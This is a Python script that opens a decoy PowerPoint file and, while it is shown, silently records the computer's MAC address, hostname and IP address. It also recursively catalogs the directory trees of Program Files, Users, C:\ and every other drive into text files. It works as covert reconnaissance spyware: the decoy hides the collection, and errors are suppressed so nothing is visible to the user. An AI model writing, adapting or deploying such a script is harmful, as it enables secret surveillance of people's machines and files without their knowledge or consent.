import os
import psutil
import getmac
import socket

# Start file
try:
    os.startfile("files\\К.ppt")
except:
    pass

# Iterates over all disks on the computer
path = []
for i in psutil.disk_partitions():
    path.append(f'{i[0]}')
path.remove('C:\\')

retreat = ''

# m - is a deep of search : 0 is 1st lvl > -1 is 2nd lvl ...
# Counts the number of lines
l = 0


def p(path, retreat):
    global l
    global currentTXT
    global g
    global m

    # Change the .txt file. Depends on num of lines
    if l >= 25000:
        currentTXT = currentTXT[0:-1] + f'{g}'
        l = 0
        g += 1

    # Check , if it is the first lvl
    if path[-1] == "\\":

        try:
            for i in os.listdir(path):

                # Misses current files
                if i == '$Recycle.Bin' or i == 'Windows' or i == '$RECYCLE.BIN':
                    continue

                # Add 1 line
                l += 1

                # Add an information to the .txt file
                with open(f'{currentTXT}.txt', 'a') as f:
                    f.write(retreat + i + '\n')

                # Causes recursive function if it is a file
                if os.path.isdir(path + f"{i}"):
                    if m == 0:
                        continue
                    m += 1
                    p(path + f"{i}", retreat + '    ')
            m -= 1
        except:
            pass
    else:
        try:
            for i in os.listdir(path):

                l += 1
                with open(f'{currentTXT}.txt', 'a') as f:
                    f.write(retreat + i + '\n')

                if os.path.isdir(path + f"\\{i}"):
                    if m == 0:
                        continue
                    m += 1
                    p(path + f"\\{i}", retreat + '    ')
            m -= 1
        except:
            pass


with open('Інформатика\\inf.txt', 'a') as f:
    f.write(getmac.get_mac_address() + '\n')
    f.write(socket.gethostname() + '\n')
    f.write(socket.gethostbyname(socket.gethostname()) + '\n')

m = 0
currentTXT = 'prf86'
p('C:\\Program Files (x86)', '')

m = 0
currentTXT = 'prf'
p('C:\\Program Files', '')

m = 1
currentTXT = 'users'
p('C:\\Users', '')

for i in path:
    m = 1
    g = 1
    currentTXT = f'disk{i[0]}0'
    p(i, retreat)

m = -3
currentTXT = 'cfls'
p('C:\\', '')
